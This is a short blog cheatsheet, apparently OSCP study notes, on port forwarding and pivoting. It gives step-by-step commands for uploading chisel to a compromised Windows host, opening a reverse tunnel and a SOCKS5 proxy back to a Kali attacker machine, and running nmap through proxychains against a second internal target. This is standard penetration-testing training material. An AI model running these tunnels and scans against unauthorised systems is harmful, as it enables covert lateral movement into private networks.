---
title: Port Forwarding and Pivoting
author: sKyW1per
category: "OSCP"
date: "2021-03-08 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---

###### Port Forwarding (windows target)
```
https://github.com/jpillora/chisel
1 upload chisel to the box

2 start chisel on kali
$ ./chisel_1.6.0_linux_amd64 server -p 8000 --reverse

3 run chisel on the target
$ .\chisel.exe client 192.168.119.1:8000 R:8888:localhost:8888

4 see if the connection is made
port 8888 on kali should be listening now:
$ netstat -ntlp

5 do stuff from kali on address 127.0.0.1 port 8888
```

###### Proxychains tunnel to a second target
```
1 upload chisel to the box

2 start chisel server on kali
$ ./chisel_1.7.7_linux_amd64 server -p 8001 --reverse --socks5

3 run chisel on the pivot machine
$ .\chisel.exe client 192.168.1.1:8001 R:1080:socks

4 see if the connection is made
$ netstat -ntlp

5 configure proxychains
add to /etc/proxychains.conf the following line:
$ socks5 127.0.0.1 1080

6 test the tunnel by executing a command to the target IP
$ proxychains ping 192.168.100.2

Note:
Syn scanning isn't possible trough a proxy, especially annoying when ping is disabled. In this case Nmap can do port scans with options "-sT -Pn"
So use for nmap for example:
$ proxychains nmap -sT -Pn -n -p- 192.168.100.2
```
